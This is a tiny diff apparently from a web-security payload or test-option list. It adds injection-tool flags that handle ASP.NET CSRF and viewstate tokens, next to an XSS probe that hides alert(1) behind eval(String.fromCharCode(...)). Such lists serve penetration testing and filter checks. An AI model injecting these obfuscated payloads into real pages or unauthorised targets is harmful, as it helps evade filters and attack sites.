@@ -1,3 +1,4 @@
+--csrf-token='__EVENTVALIDATION' --eval='__VIEWSTATE=__VIEWSTATE.replace("\\","")'
 //  alert(1)
 eval(String.fromCharCode(97,108,101,114,116,40,49,41))
 
